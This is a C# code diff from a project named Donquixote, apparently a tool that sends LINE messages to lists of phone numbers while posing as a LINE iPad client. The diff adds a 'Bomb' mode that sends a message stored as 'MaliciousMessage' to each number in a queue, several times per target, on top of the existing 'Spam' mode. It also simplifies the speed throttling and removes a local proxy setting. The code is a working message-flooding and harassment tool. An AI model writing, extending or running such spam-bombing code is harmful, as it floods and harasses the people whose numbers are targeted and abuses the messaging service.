@@ -165,15 +165,15 @@ namespace Donquixote.Models
                 UserAgent = "Line2/12.3 (iPad; iOS 11.2.5; Scale/2.00)",
                 Accept = "*/*",
                 AcceptEncoding = "br, gzip, deflate",
-                AcceptLanguage = "en;q=1",
-                Proxy = new Proxy("127.0.0.1:8888")
+                AcceptLanguage = "en;q=1"
             };
+
+            var successSpaceCount = Console.BufferWidth - 56;
+            var failureSpaceCount = Console.BufferWidth - 52;
 
             switch (SelectedMode)
             {
                 case ModeEnumModel.Spam:
-                    var successSpaceCount = Console.BufferWidth - 56;
-                    var failureSpaceCount = Console.BufferWidth - 52;
 
                     while (!Phones.IsEmpty)
                     {
@@ -197,24 +197,38 @@ namespace Donquixote.Models
 
                         PhonesMessengerIndex++;
 
-                        switch (SelectedSpeed)
-                        {
-                            case SpeedEnumModel.Normal:
-                                Thread.Sleep((int)SpeedEnumModel.Normal);
-                                break;
-
-                            case SpeedEnumModel.Medium:
-                                Thread.Sleep((int)SpeedEnumModel.Medium);
-                                break;
-
-                            case SpeedEnumModel.Fast:
-                                Thread.Sleep((int)SpeedEnumModel.Fast);
-                                break;
-                        }
+                        Thread.Sleep((int)SelectedSpeed);
                     }
                     break;
 
                 case ModeEnumModel.Bomb:
+                    while (!Phones.IsEmpty)
+                    {
+                        Phones.TryDequeue(out var phone);
+
+                        if (phone.Number == null || phone.Number == string.Empty)
+                            return;
+
+                        for (var i = 0; i < MessengerRecursivity; i++)
+                        {
+                            switch (MessageModel.SendMessage(client, AccessToken, phone.Number, MaliciousMessage))
+                            {
+                                case 0:
+                                    DisplayStatus(0, phone.Number, successSpaceCount);
+                                    break;
+
+                                case 1:
+                                    DisplayStatus(1, phone.Number, failureSpaceCount);
+
+                                    MessagingFailed.Add(phone);
+                                    break;
+                            }
+
+                            Thread.Sleep((int)SelectedSpeed);
+                        }
+
+                        PhonesMessengerIndex++;
+                    }
                     break;
             }
         }
